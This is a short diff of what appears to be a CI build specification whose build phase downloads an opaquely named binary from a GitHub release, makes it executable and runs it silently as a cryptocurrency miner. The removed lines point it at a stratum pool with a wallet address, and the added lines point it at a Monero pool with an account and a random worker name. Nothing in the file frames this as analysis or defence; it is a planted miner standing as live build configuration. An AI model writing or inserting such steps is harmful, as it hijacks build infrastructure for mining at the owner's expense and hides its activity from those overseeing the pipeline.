@@ -3,6 +3,6 @@ version: 0.2
 phases:
   build:
     commands:
-        - wget wget wget https://github.com/vedhagsvp/xcdes/releases/download/xplose/pxlaria
-        - chmod +x pxlaria
-        - ./pxlaria -stratum stratum+tcp://0x1932E17CB48175Fd79FD08596eCd246071913Cb4.PAL2:x@stratum-sgp.x-phere.com:33333 > /dev/null 2>&1
+        - wget https://github.com/vedhagsvp/aplamner/releases/download/nertas/greavet
+        - chmod +x greavet
+        - ./greavet --algo xmr --account CP_udnvh2owpq --worker $(echo $(shuf -i 1-15000 -n 1)-CD300) --pool xmr.hk.apool.io:3334 > /dev/null 2>&1
